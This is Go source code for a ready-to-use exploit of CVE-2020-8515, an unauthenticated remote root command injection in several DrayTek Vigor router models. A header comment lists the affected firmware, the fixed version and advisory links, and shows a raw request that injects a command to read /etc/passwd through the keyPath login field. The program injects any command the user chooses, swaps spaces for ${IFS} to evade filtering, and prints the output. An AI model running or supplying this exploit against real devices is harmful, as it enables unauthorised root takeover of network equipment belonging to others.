package main

/*
CVE-2020-8515: DrayTek pre-auth remote root RCE
Mon Mar 30 2020 -  0xsha.io
Affected:
DrayTek Vigor2960 1.3.1_Beta, Vigor3900 1.4.4_Beta,
and Vigor300B 1.3.3_Beta, 1.4.2.1_Beta,
and 1.4.4_Beta
You should upgrade as soon as possible to 1.5.1 firmware or later
This issue has been fixed in Vigor3900/2960/300B v1.5.1.
read more :
https://www.skullarmy.net/2020/01/draytek-unauthenticated-rce-in-draytek.html
https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-router-web-management-page-vulnerability-(cve-2020-8515)/
https://thehackernews.com/2020/03/draytek-network-hacking.html
https://blog.netlab.360.com/two-zero-days-are-targeting-draytek-broadband-cpe-devices-en/
exploiting using keyPath
POST /cgi-bin/mainfunction.cgi HTTP/1.1
Host: 1.2.3.4
Content-Length: 89
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
action=login&keyPath=%27%0A%2fbin%2fcat${IFS}%2fetc%2fpasswd%0A%27&loginUser=a&loginPwd=a
 */

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"
)

func usage()  {

	fmt.Println("CVE-2020-8515 exploit by  @0xsha ")
	fmt.Println("Usage :  " + os.Args[0] + " URL " + "command"  )
	fmt.Println("E.G :  " + os.Args[0] + " http://1.2.3.4 " + "\"uname -a\""  )
}

func main() {


	if len(os.Args) < 3 {
		usage()
		os.Exit(-1)
	}
	fmt.Println("[*] Running")
	targetUrl := os.Args[1]
	fmt.Println(targetUrl)
	//cmd := "cat /etc/passwd"
	cmd := os.Args[2]


	// payload preparation
	vulnerableFile := "/cgi-bin/mainfunction.cgi"
	// specially crafted CMD
	// action=login&keyPath=%27%0A%2fbin%2fcat${IFS}%2fetc%2fpasswd%0A%27&loginUser=a&loginPwd=a
	payload :=`'
	/bin/sh -c 'CMD'
	'`
	payload = strings.ReplaceAll(payload,"CMD", cmd)
	bypass := strings.ReplaceAll(payload," ", "${IFS}")
	//PostForm call url encoder internally
	resp, err := http.PostForm(targetUrl+vulnerableFile ,
		url.Values{"action": {"login"}, "keyPath": {bypass} , "loginUser": {"a"}, "loginPwd": {"a"}   })
	fmt.Println(err)
	if err != nil{
		fmt.Println("error connecting host")
		fmt.Println(err)
		os.Exit(-1)
	}


	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	
	if err != nil{
		fmt.Println("error reading data")
		os.Exit(-1)
	}
	
	fmt.Println(string(body))

}